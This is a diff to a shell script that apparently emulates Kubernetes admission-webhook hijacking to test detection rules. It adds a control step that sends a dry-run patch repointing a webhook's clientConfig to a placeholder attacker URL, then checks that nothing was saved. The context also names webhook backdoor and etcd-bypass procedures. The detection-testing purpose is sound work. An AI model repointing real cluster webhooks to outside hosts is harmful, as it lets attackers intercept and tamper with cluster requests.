@@ -23,6 +23,7 @@
 #                           (strategic merge patch, JSON patch, PUT, server-side apply), and
 #                           install one new URL-mode webhook with kubectl apply --server-side
 #                           (a create that the API server performs as a PATCH answered 201; K21)
+#   ./emulate_k8s.sh dryrun a server-side dry-run repoint that must NOT fire the rules (control)
 #   ./emulate_k8s.sh gap    node-local etcd bypass demonstration (read-only)
 #   ./emulate_k8s.sh all    every item, in order, then clean up
 #
@@ -92,7 +93,8 @@ cleanup() {
   kubectl delete validatingwebhookconfiguration trr9025-vwc --ignore-not-found >/dev/null 2>&1 || true
   kubectl delete validatingadmissionpolicy trr9025-vap --ignore-not-found >/dev/null 2>&1 || true
   kubectl delete validatingwebhookconfiguration trr9025-hijack-smp trr9025-hijack-json \
-    trr9025-hijack-put trr9025-hijack-ssa trr9025-ssa-create --ignore-not-found >/dev/null 2>&1 || true
+    trr9025-hijack-put trr9025-hijack-ssa trr9025-ssa-create trr9025-dryrun-vwc \
+    --ignore-not-found >/dev/null 2>&1 || true
 }
 
 # Procedure A — mutating webhook backdoor. Wildcard rules + off-cluster URL. An
@@ -268,6 +270,33 @@ procedure_d() {
   return "$rc"
 }
 
+# Dry run — a control, not a procedure: a server-side dry run persists nothing, so the
+# repoint grader and the TRR9008 chokepoint must NOT fire on it (the validator's
+# MISS_MANIFEST). The step installs a harmless Service-backed webhook config
+# trr9025-dryrun-vwc (as Procedure D does), then sends Procedure D's strategic merge
+# patch (service -> url) with --dry-run=server, which kubectl sends as the ?dryRun=All
+# query (cli-runtime resource.Helper Patch, v1.36.4). Then the step checks that the
+# stored webhook still calls the Service and has no url, so a dry run that persisted
+# fails the step. The name starts with trr9025-dryrun-, which no positive gate selects;
+# cleanup deletes it outside this step's ledger window.
+procedure_dryrun() {
+  local url svc
+  log "dryrun: install Service-backed webhook trr9025-dryrun-vwc, then a --dry-run=server patch: service -> url"
+  _hijack_vwc trr9025-dryrun-vwc | apply_stdin apply || return
+  must kubectl patch validatingwebhookconfiguration trr9025-dryrun-vwc --dry-run=server \
+    -p "{\"webhooks\":[{\"name\":\"w.trr9025.example.com\",\"clientConfig\":{\"service\":null,\"url\":\"${EVIL_URL}\"}}]}" \
+    || return
+  # A server-side dry run persists nothing: the webhook still calls its Service.
+  url="$(kubectl get validatingwebhookconfiguration trr9025-dryrun-vwc \
+    -o jsonpath='{.webhooks[0].clientConfig.url}' 2>/dev/null || true)"
+  svc="$(kubectl get validatingwebhookconfiguration trr9025-dryrun-vwc \
+    -o jsonpath='{.webhooks[0].clientConfig.service.name}' 2>/dev/null || true)"
+  if [ -n "$url" ] || [ "$svc" != "trr9025-nosvc" ]; then
+    log "dryrun: the dry run persisted (url '${url}', service '${svc:-absent}')"
+    return 1
+  fi
+}
+
 # Gap — the control-plane bypass. An adversary with control-plane node / etcd access can
 # write a webhook configuration straight into etcd, with NO API create and NO audit
 # event, so the chokepoint is blind. Read-only demonstration.
@@ -287,15 +316,15 @@ procedure_gap() {
 
 run_one() {
   case "$1" in
-    a|b|c|d|gap) run_proc "$1" ;;
-    *) log "unknown item: $1 (use a|b|c|d|gap|all)"; exit 2 ;;
+    a|b|c|d|dryrun|gap) run_proc "$1" ;;
+    *) log "unknown item: $1 (use a|b|c|d|dryrun|gap|all)"; exit 2 ;;
   esac
 }
 
 main() {
   local which="${1:-all}"
   if [ "$which" = "all" ]; then
-    for p in a b c d gap; do run_proc "$p"; done
+    for p in a b c d dryrun gap; do run_proc "$p"; done
     cleanup
   else
     run_one "$which"
